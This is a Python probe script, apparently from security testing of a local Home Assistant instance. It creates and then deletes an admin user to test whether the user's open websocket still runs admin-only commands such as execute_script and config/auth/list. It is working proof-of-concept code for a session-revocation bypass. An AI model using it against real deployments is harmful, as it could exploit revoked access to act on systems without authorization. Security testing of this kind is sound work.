"""E7.6b — blast radius: which @require_admin websocket commands survive user removal?
Controls run pre-removal; the same commands re-run post-removal on the SAME socket."""
import asyncio, json
import aiohttp, websockets
BASE="http://localhost:8124"; WS="ws://localhost:8124/api/websocket"; CID="http://localhost:8124/"
OWNER=("tsowner","Owner-Passw0rd-123"); PW="Member-Passw0rd-123"; EID="input_boolean.ts_probe"
log=lambda m: print(m, flush=True)
async def tokc(s,c):
    async with s.post(f"{BASE}/auth/token", data={"grant_type":"authorization_code","code":c,"client_id":CID}) as r: return await r.json()
async def login(s,u,p):
    async with s.post(f"{BASE}/auth/login_flow", json={"client_id":CID,"handler":["homeassistant",None],"redirect_uri":CID,"type":"authorize"}) as r: f=(await r.json())["flow_id"]
    async with s.post(f"{BASE}/auth/login_flow/{f}", json={"client_id":CID,"username":u,"password":p}) as r:
        j=await r.json()
        if "result" not in j: raise SystemExit(f"login {u}: {j}")
    return (await tokc(s,j["result"]))["access_token"]
class C:
    def __init__(s,ws): s.ws,s.id=ws,0
    async def cmd(s,**kw):
        s.id+=1; await s.ws.send(json.dumps({"id":s.id,**kw}))
        while True:
            m=json.loads(await asyncio.wait_for(s.ws.recv(),timeout=15))
            if m.get("id")==s.id and m["type"]=="result": return m
async def conn(t):
    ws=await websockets.connect(WS,max_size=None); await ws.recv()
    await ws.send(json.dumps({"type":"auth","access_token":t})); m=json.loads(await ws.recv())
    return (C(ws),m) if m["type"]=="auth_ok" else (None,m)
async def state(c,e):
    r=await c.cmd(type="get_states")
    for s in r["result"]:
        if s["entity_id"]==e: return s["state"]
async def probe(m,owner,label):
    out={}
    # 1. execute_script -> service call (the potential bypass)
    await owner.cmd(type="call_service",domain="input_boolean",service="turn_off",target={"entity_id":EID}); await asyncio.sleep(0.4)
    try:
        r=await m.cmd(type="execute_script",sequence=[{"service":"input_boolean.turn_on","target":{"entity_id":EID}}])
        await asyncio.sleep(1.2); st=await state(owner,EID)
        out["execute_script"]=f"success={r.get('success')} entity={st}" + ("  <== ACTUATED" if st=="on" else "")
    except Exception as e: out["execute_script"]=f"EXC {type(e).__name__}"
    # 2. subscribe_trigger (admin-gated)
    try:
        r=await m.cmd(type="subscribe_trigger",trigger={"platform":"event","event_type":"ts_x"})
        out["subscribe_trigger"]=f"success={r.get('success')} err={r.get('error',{}).get('code') if r.get('error') else None}"
    except Exception as e: out["subscribe_trigger"]=f"EXC {type(e).__name__}"
    # 3. a config read command (admin-gated)
    try:
        r=await m.cmd(type="config/auth/list")
        out["config/auth/list"]=f"success={r.get('success')} n={len(r.get('result',[])) if r.get('success') else '-'}"
    except Exception as e: out["config/auth/list"]=f"EXC {type(e).__name__}"
    log(f"  [{label}]")
    for k,v in out.items(): log(f"      {k:22s} {v}")
    return out

async def main():
    async with aiohttp.ClientSession() as s:
        otok=await login(s,*OWNER); owner,_=await conn(otok)
        r=await owner.cmd(type="config/auth/create",name="TS Surface",group_ids=["system-admin"],local_only=False)
        uid=r["result"]["user"]["id"]
        await owner.cmd(type="config/auth_provider/homeassistant/create",user_id=uid,username="member_surf",password=PW)
        mtok=await login(s,"member_surf",PW); m,_=await conn(mtok)
        log(f"admin member connected (uid={uid})")
        pre=await probe(m,owner,"CONTROL pre-removal")
        d=await owner.cmd(type="config/auth/delete",user_id=uid); log(f"  DELETE success={d['success']}"); await asyncio.sleep(2)
        post=await probe(m,owner,"POST-REMOVAL (orphaned socket)")
        log("")
        log("  SUMMARY  command              pre-removal -> post-removal")
        for k in pre: log(f"    {k:22s} {pre[k]}  ->  {post.get(k)}")
        try: await m.ws.close()
        except Exception: pass
        await owner.ws.close()
asyncio.run(main())
